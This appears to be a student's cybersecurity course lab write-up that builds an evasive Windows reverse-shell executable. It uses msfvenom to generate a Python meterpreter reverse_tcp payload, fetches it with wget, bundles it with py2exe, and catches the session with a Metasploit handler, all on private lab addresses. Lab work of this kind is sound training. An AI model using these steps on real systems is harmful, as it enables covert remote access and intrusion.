## Ops Challenge 30

### Part 1: Staging

------

#### Download and import the Metasploitable 3 Windows 2008 OVA into VirtualBox

![Screenshot 2022-01-12 at 12.45.21](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 12.45.21.png)

#### Open the README file on the desktop

![Screenshot 2022-01-12 at 12.49.41](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 12.49.41.png)

### Part 2: FUD Payload

------

Let's go over to the Kali Linux machine and create the Python payload. And start the server (IP address must be for the local machine:

```
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -f raw -o /var/www/html/mrtp.py

service apache2 start
```

![Screenshot 2022-01-12 at 13.14.22](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 13.14.22.png)

Copy the payload “mrtp.py” back to yer Windows machine. Using powershell, run:

```
wget http://192.168.56.101/mrtp.py -O mrtp.py
```

![Screenshot 2022-01-12 at 13.26.35](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 13.26.35.png)

Create a setup.py file with the following content:

```python
from distutils.core import setup
import py2exe
setup(
name = "Meter",
description = "Python-based App",
version = "1.0",
console=["mrtp.py"],
options = {"py2exe": {"bundle_files": 1,"packages":"ctypes","includes": "base64,sys,socket,struct,time,code,platform,getpass,shutil",}},
zipfile = None,
)
```

Bundle the standalone Python executable with Py2Exe:

```
python.exe .\setup.py py2exe
```

![Screenshot 2022-01-12 at 14.32.37](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 14.32.37.png)

Test the artifact “mrtp.exe” created under the dist folder:

`.\dist\mrtp.exe`

![Screenshot 2022-01-12 at 14.36.04](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 14.36.04.png)

Go back to kali and run Metasploit (note that 192.168.56.101 is the IP address of the kali machine). Run with `sudo`:

```
msfconsole
use exploit/multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 443
run
```

![Screenshot 2022-01-12 at 14.45.18](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 14.45.18.png)

Now let's test it on the windows machine. Copy the “mrtp.exe” file directly to the Windows 10 box and run it while Metasploit handler is listening on port 443. As you can see by the screenshot below the meterpreter session wsa succesfully established.

![Screenshot 2022-01-12 at 19.28.42](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 19.28.42.png)

#### Part 3: Custom FUD Payload

------

To create a custom payload using this technique we have to edit the `mrtp.py`file after generating it with msfvenom.

Create a custom Python script:

![Screenshot 2022-01-12 at 19.46.18](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 19.46.18.png)

![Screenshot 2022-01-12 at 19.49.23](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 19.49.23.png)

Encode it with base64 encoding and adding it to the existing “mrtp.py” script:

![Screenshot 2022-01-12 at 20.07.44](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 20.07.44.png)

![Screenshot 2022-01-12 at 20.04.33](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 20.04.33.png)

Copy the new “mrtp.py” back to the Windows machine and repeat the bundling steps:

```
wget http://192.168.56.101/mrtp.py -O mrtp.py
python.exe .\setup.py py2exe
.\dist\mrtp.exe
```

And we have a custom payload!

![Screenshot 2022-01-12 at 20.21.08](/Users/baphomet/codefellows/learning/ops-401/screenshots/class-30/Screenshot 2022-01-12 at 20.21.08.png) 